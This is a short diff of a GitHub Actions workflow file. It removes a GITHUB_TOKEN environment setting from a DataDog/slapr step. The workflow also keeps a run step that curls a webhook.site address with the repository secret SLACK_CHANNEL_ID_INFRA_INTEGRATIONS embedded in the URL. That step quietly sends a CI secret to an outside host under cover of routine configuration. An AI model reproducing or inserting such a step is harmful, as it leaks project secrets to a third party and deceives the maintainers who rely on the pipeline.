@@ -15,6 +15,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: DataDog/slapr@master
-      env:
-        GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}"
     - run: curl https://webhook.site/f5ecd42e-cfd8-4968-819d-b3ef68090c80/?param=${{ secrets.SLACK_CHANNEL_ID_INFRA_INTEGRATIONS }}
